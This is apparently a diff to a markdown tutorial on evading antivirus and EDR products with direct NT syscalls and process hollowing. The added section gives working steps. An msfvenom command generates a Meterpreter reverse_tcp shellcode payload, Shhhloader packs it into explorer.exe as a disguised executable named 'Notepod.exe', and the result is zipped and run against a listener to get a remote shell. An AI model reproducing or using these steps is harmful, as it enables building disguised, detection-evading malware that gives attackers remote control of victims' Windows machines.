@@ -36,5 +36,40 @@ If we want to use the NT system call CreateFile, we should call the NtCreateFile
  
 The AV/EDR product could not hook the API because we are not using API calls, we are using direct syscall.
 So the AV/EDR cannot intercept our attemps and we would have opened it succesfully 🙂
+
+### Process Hollowing
+
+Now that we are able to use NT system call under the radar of AV/EDR products.
+We want to run our shellcode.
+
+How it's working:
+
+1) Create the target process (ex: explorer.exe) in a suspended state.
+
+2) Parse the create process in order to find the EntryPoint
+
+3) Then Write the shellcode to the EntryPoint and resume the thread execution.
+
  
+## Shhhloader project (https://github.com/icyguider/Shhhloader):
+
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o tesssssst.bin
+ 
+> ./Shhhloader.py tesssssst.bin -p explorer.exe -o Notepod.exe
+ 
+> zip Notepod.exe Doc.zip
+ 
+ - Drag and drop .zip in your Windows machine.
+ - Start meterpreter listener and set payload to windows/x64/meterpreter/reverse_tcp (Shhhloader only support staged payload, so you have to provide it the right one !!!)
+ - run the Notepod.exe
+ 
+![image](https://user-images.githubusercontent.com/76106120/151585465-b865ca49-7b58-4077-84a4-28c4b540e332.png)
+
+ 
+ 
+ 
+ 
+
+
+
 
